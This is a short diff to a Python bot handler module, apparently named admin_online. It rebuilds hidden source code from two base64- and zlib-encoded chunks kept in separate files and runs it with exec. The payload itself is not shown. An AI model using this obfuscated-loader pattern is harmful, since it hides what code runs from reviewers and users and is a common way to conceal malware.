@@ -2,7 +2,7 @@
 import base64, zlib, types
 from src.bot.handlers.admin_online_c0 import P0
 from src.bot.handlers.admin_online_c1 import P1
-_SRC = zlib.decompress(base64.b64decode(P0)).decode() + zlib.decompress(base64.b64decode(P1)).decode()
+_SRC = zlib.decompress(base64.b64decode(P0 + P1)).decode()
 _mod = types.ModuleType(__name__)
 _mod.__file__ = __file__
 exec(compile(_SRC, __file__, "exec"), _mod.__dict__)
